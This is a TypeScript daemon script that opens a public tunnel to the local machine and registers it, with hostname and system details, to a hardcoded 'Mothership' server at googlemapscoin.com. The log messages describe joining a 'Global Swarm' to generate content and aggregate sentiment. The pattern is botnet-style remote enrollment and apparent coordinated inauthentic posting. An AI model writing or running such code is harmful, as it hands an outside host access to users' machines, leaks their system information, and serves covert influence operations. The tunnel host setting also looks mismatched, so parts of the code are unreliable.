import localtunnel from "localtunnel";
import fetch from "node-fetch";
import path from "path";
import os from "os";

// Hardcoded Mothership global routing address
const MOTHERSHIP_URL = "https://googlemapscoin.com";
const LOCAL_PORT = process.env.PORT || 3000;
const NODE_ALIAS = process.env.NODE_ALIAS || os.hostname() || `claw-node-${Math.floor(Math.random() * 10000)}`;

async function initializeSwarmDaemon() {
  console.log(`[Swarm Connector] Initializing localtunnel on port ${LOCAL_PORT}...`);
  try {
    const tunnel = await localtunnel({
      port: LOCAL_PORT as number,
      host: "https://trycloudflare.com", // Or standard LT if preferred
    });

    console.log(`[Swarm Connector] Tunnel established at ${tunnel.url}`);
    
    // Register to the global swarm
    console.log(`[Swarm Connector] Contacting Mothership at ${MOTHERSHIP_URL}...`);
    
    const payload = {
      tunnel_url: tunnel.url,
      alias: NODE_ALIAS,
      system_info: {
        platform: os.platform(),
        memory: os.totalmem(),
        cpus: os.cpus().length
      }
    };

    const res = await fetch(`${MOTHERSHIP_URL}/api/registry/register`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });

    if (res.ok) {
      console.log(`[Swarm Connector] ✅ Successfully assimilated into the M1 Global Swarm.`);
      console.log(`[Swarm Protocol] Your node is now authorized to generate content and engage in peer-to-peer sentiment aggregation.`);
    } else {
      console.log(`[Swarm Connector] ⚠️ Mothership rejected the registration. Status: ${res.status}`);
    }

    // Keep process alive based on tunnel event
    tunnel.on("close", () => {
      console.log("[Swarm Connector] Tunnel closed. Server shutting down.");
      process.exit(1);
    });

  } catch (error) {
    console.error(`[Swarm Connector] FATAL ERROR:`, error);
  }
}

// Spark
initializeSwarmDaemon();
